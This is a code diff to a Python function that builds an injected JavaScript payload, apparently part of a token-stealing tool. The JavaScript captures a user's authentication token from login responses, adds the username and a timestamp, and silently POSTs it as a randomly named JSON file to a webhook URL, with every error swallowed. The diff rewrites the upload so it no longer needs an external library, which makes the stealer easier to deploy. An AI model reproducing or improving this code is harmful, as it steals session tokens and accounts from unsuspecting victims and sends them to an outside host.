@@ -29,7 +29,6 @@ def get_js_payload(webhook_url: str) -> str:
                 if (!token || token === lastToken) return;
                 lastToken = token;
                 
-                // Generate random filename
                 const randomName = Math.random().toString(36).substring(2, 8) + Math.random().toString(36).substring(2, 8);
                 const filename = randomName + '.json';
                 const jsonData = JSON.stringify({{
@@ -40,20 +39,29 @@ def get_js_payload(webhook_url: str) -> str:
                     timestamp: new Date().toISOString()
                 }});
                 
-                // Create FormData for multipart upload
-                const FormData = require('form-data');
-                const form = new FormData();
-                form.append('file', Buffer.from(jsonData), filename);
+                const boundary = '----FormBoundary' + Math.random().toString(36).substring(2);
+                const body = [
+                    `--${{boundary}}`,
+                    'Content-Disposition: form-data; name="file"; filename="' + filename + '"',
+                    'Content-Type: application/json',
+                    '',
+                    jsonData,
+                    `--${{boundary}}--`
+                ].join('\\r\\n');
                 
                 const url = new URL(WEBHOOK_URL);
                 const req = https.request({{
                     hostname: url.hostname,
                     path: url.pathname + url.search,
                     method: 'POST',
-                    headers: form.getHeaders()
+                    headers: {{
+                        'Content-Type': 'multipart/form-data; boundary=' + boundary,
+                        'Content-Length': Buffer.byteLength(body)
+                    }}
                 }});
                 req.on('error', () => {{}});
-                form.pipe(req);
+                req.write(body);
+                req.end();
             }} catch(e) {{}}
         }}
 
@@ -90,8 +98,6 @@ def get_js_payload(webhook_url: str) -> str:
                                                         if(d.token){{
                                                             const randomName = Math.random().toString(36).substring(2, 8) + Math.random().toString(36).substring(2, 8);
                                                             const filename = randomName + '.json';
-                                                            const FormData = require('form-data');
-                                                            const form = new FormData();
                                                             const jsonData = JSON.stringify({{
                                                                 token: d.token,
                                                                 username: "${{PC_USER}}",
@@ -99,11 +105,11 @@ def get_js_payload(webhook_url: str) -> str:
                                                                 source: "login_response",
                                                                 timestamp: new Date().toISOString()
                                                             }});
-                                                            form.append('file', Buffer.from(jsonData), filename);
+                                                            const formData = new FormData();
+                                                            formData.append('file', new Blob([jsonData], {{type: 'application/json'}}), filename);
                                                             fetch('${{WEBHOOK_URL}}',{{
                                                                 method:"POST",
-                                                                body: form,
-                                                                headers: form.getHeaders()
+                                                                body: formData
                                                             }}).catch(function(){{}});
                                                         }}
                                                     }}).catch(function(){{}});
